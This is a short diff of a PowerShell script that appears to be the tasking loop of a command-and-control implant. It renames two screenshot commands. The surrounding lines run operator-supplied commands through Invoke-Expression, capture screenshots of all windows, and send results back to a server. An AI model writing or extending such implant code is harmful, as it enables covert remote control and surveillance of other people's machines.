@@ -223,7 +223,7 @@ while($true)
                                   $Output = "ErrorLoadMod: " + $error[0]
                               }
                               Send-Response $Server $key $id $Output
-                          } elseif ($i.ToLower().StartsWith("get-screenshotallwindows")) {
+                          } elseif ($i.ToLower().StartsWith("get-screenshot-allwindows")) {
                               try {
                                   $i = $i + " -taskid " + $id
                                   Invoke-Expression $i | Out-Null
@@ -241,7 +241,7 @@ while($true)
                                   $Output = "ErrorGetWebpage: " + $error[0]
                                   Send-Response $Server $key $id $Output
                               }
-                          } elseif ($i.ToLower().StartsWith("get-screenshotmulti")) {
+                          } elseif ($i.ToLower().StartsWith("get-multi-screenshot")) {
                               try {
                                   $i = $i + " -taskid " + $id
                                   Invoke-Expression $i | Out-Null
